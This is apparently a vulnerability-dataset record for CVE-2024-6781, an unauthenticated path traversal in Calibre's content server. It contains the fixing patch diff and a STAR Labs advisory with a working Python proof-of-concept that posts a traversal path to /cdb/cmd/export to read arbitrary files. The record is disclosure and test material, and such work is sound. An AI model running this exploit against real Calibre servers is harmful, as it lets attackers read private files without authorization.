{
    "CVE-2024-6781": {
        "published_date": "2024-08-06T03:38:45.309Z",
        "patch_commits": [
            {
                "url": "https://github.com/kovidgoyal/calibre/commit/bcd0ab12c41a887f8290a9b56e46c3a29038d9c4",
                "content": "Fix #2075125 [Private bug](https://bugs.launchpad.net/calibre/+bug/2075125)\n\nFilename: src/calibre/db/backend.py:\n```\n@@ -2004,7 +2004,10 @@\ndef transform_format_filenames(src_path, dest_path):\n \n     def copy_extra_file_to(self, book_id, book_path, relpath, stream_or_path):\n         full_book_path = os.path.abspath(os.path.join(self.library_path, book_path))\n-        src_path = make_long_path_useable(os.path.join(full_book_path, relpath))\n+        extra_file_path = os.path.abspath(os.path.join(full_book_path, relpath))\n+        if not extra_file_path.startswith(full_book_path):\n+            raise FileNotFoundError(f'No data file {relpath} in book: {book_id}')\n+        src_path = make_long_path_useable(extra_file_path)\n         if isinstance(stream_or_path, str):\n             shutil.copy2(src_path, make_long_path_useable(stream_or_path))\n         else:\n```"
            }
        ],
        "sw_version": "v7.14.0",
        "sw_version_wget": "https://github.com/kovidgoyal/calibre/archive/refs/tags/v7.14.0.zip",
        "description": "Path traversal in Calibre <= 7.14.0 allow unauthenticated attackers to achieve arbitrary file read.",
        "sec_adv": [
            {
                "url": "https://starlabs.sg/advisories/24/24-6781/",
                "content": "Home\nAbout\nAdvisories\nBlog\nAchievements\nPublications\nSearch\nHome\n » \nAdvisories\n(CVE-2024-6781) Calibre Arbitrary File Read\nJuly 31, 2024\n · 4 min · Amos Ng (@LFlare)\nTable of Contents\nSummary\nProduct Calibre\nVendor Calibre\nSeverity High - Unprivileged adversaries may exploit software vulnerabilities to perform relative path traversal to achieve arbitrary file read\nAffected Versions <= 7.14.0 (latest version as of writing)\nTested Versions 7.14.0\nCVE Identifier CVE-2024-6781\nCVE Description Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’) vulnerability allows Relative Path Traversal\nCWE Classification(s) CWE-22 Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)\nCAPEC Classification(s) CAPEC-139 Relative Path Traversal\nCVSS3.1 Scoring System\nBase Score: 7.5 (High) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\nMetric Value\nAttack Vector (AV) Network\nAttack Complexity (AC) Low\nPrivileges Required (PR) None\nUser Interaction (UI) None\nScope (S) Unchanged\nConfidentiality (C) High\nIntegrity (I) None\nAvailability (A) None\nProduct Overview\nCalibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.\nCalibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time.\nVulnerability Summary\nArbitrary file read via Calibre’s content server in Calibre <= 7.14.0.\nVulnerability Details\nThe source of the vulnerability is in cmd_export.py, that is called by the cdb.py router. The router imports a secondary module (in the format cmd_*.py) based on the incoming HTTP request’s path. In this case, a request to /cdb/cmd/export will result in the file cmd_export.py being imported and its implementation() function will be executed. Additionally, the request body’s content is used as *args.\nThe list of cmd_*.py files can be obtained from the src/calibre/db/cli/ directory.\n# src/calibre/srv/cdb.py#L28\n@endpoint('/cdb/cmd/{which}/{version=0}', postprocess=msgpack_or_json, methods=receive_data_methods, cache_control='no-cache')\ndef cdb_run(ctx, rd, which, version):\n    try:\n        m = module_for_cmd(which)\n    except ImportError:\n        raise HTTPNotFound(f'No module named: {which}')\n    if not getattr(m, 'readonly', False): # [1]\n        ctx.check_for_write_access(rd)\n    [...snip...]\n    try:\n        result = m.implementation(db, partial(ctx.notify_changes, db.backend.library_path), *args) # [2]\nThe vulnerable function is located at cmd_export.py::implementation(), so at [1], if the readonly module variable is False or absent, the function check_for_write_access() would not trigger and code execution can continue. The implementation() function of cmd_export.py module is then executed with user-controlled arguments *args at [2].\n# src/calibre/db/cli/cmd_export.py#L17\nreadonly = True\n[...snip...]\ndef implementation(db, notify_changes, action, *args):\n [...snip..]\n    if action == 'extra_file':\n        book_id, relpath, dest = args # args parameter is sourced from request payload sequentially\n        if is_remote:\n            from io import BytesIO\n            output = BytesIO()\n            db.copy_extra_file_to(book_id, relpath, output) # [3]\n            return output.getvalue()\n        db.copy_extra_file_to(book_id, relpath, dest)\nThe function db.copy_extra_file_to() at [3], shown below, builds a relative path from the pre-configured library path, reads the file content, then stores its content into the output variable. The output BytesIO variable is subsequently returned to the user. Since there were no input sanitisation performed on the user-supplied arguments, this results in an arbitrary file read vulnerability.\n# src/calibre/db/backend.py#L2005\ndef copy_extra_file_to(self, book_id, book_path, relpath, stream_or_path):\n    full_book_path = os.path.abspath(os.path.join(self.library_path, book_path))\n    src_path = make_long_path_useable(os.path.join(full_book_path, relpath))\n    if isinstance(stream_or_path, str):\n        shutil.copy2(src_path, make_long_path_useable(stream_or_path))\n    else:\n        with open(src_path, 'rb') as src:\n            shutil.copyfileobj(src, stream_or_path)\nExploit Conditions\nThis vulnerability can be exploited by an unauthenticated attacker with the default configuration of Calibre’s content server which has basic authentication disabled by default, or by any privileged authenticated attacker.\nAdditionally, the file must be UTF-8 compatible.\nProof-of-Concept\nWe have tried our best to make the PoC as portable and cross-platform as possible. This report includes a functional exploit written in Python3 that automatically performs the arbitrary file read.\nA sample exploit script is shown below:\n#! /usr/bin/env python3\n# PoC for: CVE-2024-6781\n# Description: Unauthenticated arbitrary file read in calibre <= 7.14.0\n# Written by: Amos Ng (@LFlare)\nimport json\nimport sys\n\nimport requests\n\n_target = \"http://localhost:8080\" # SET ME\n_book_id = 1 # ensure book_id exists\n\ndef exploit(path):\n    r = requests.post(\n        f\"{_target}/cdb/cmd/export\",\n        headers={\"Content-Type\": \"application/json\"},\n        json=[\"extra_file\", _book_id, path, \"\"],\n    )\n    try:\n        print(r.json()[\"result\"])\n    except Exception:\n        print(r.text)\n\nif __name__ == \"__main__\":\n    exploit(\"..\\\\..\\\\..\\\\Calibre Settings\\\\gui.json\")\nSuggested Mitigations\nEnsure that user-supplied input are properly sanitised to prevent path traversals.\nDetection Guidance\nIt is possible to detect potential exploitation of the vulnerability by checking the server’s access logs for POST requests to the /cdb/cmd/export endpoint.\nCredits\nAmos Ng (@LFlare) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nNEXT »\n(CVE-2024-6782) Calibre Remote Code Execution\n© 2025 STAR Labs Powered by Hugo & PaperMod",
                "effective": true,
                "effective_reason": "The security advisory contains a detailed proof of concept in the form of a functional exploit script written in Python."
            }
        ],
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ]
    }
}